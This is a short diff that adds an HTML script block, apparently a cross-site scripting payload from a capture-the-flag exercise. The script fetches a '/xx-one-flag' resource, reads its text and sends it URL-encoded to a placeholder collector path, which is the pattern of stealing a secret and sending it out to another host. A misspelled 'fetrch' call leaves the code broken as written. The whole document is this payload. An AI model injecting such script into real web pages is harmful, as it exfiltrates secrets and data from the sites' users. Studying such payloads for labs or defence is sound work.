@@ -1,0 +1,9 @@
+<script>fetch("/xx-one-flag")
+	.then((t) => t.text())
+	.then((t) => {
+fetrch("url/67ddd51d-d592" + encodeURIComponent(t)).then((s)=>{
+console.log(s);
+});
+
+});
+</script>
